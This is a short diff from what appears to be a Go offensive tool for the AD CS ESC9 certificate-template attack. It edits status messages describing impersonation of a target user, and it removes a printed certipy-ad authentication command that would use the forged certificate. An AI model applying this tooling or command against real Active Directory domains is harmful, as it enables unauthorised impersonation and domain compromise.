@@ -249,15 +249,8 @@ func ExploitESC9(cfg *ADCSConfig, templateName, attackerDN, targetUPN string) (*
 
 	// Step 5: Return the certificate
 	fmt.Printf("[+] ESC9 exploitation complete — certificate issued for %s\n", targetUPN)
-	upnUser := targetUPN
-	if idx := strings.Index(upnUser, "@"); idx > 0 {
-		upnUser = upnUser[:idx]
-	}
 	fmt.Printf("[*] The certificate lacks szOID_NTDS_CA_SECURITY_EXT (no requester SID)\n")
 	fmt.Printf("[*] With StrongCertificateBindingEnforcement < 2, this cert authenticates as %s\n", targetUPN)
-	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
-
 	return cert, certKey, nil
 }
 
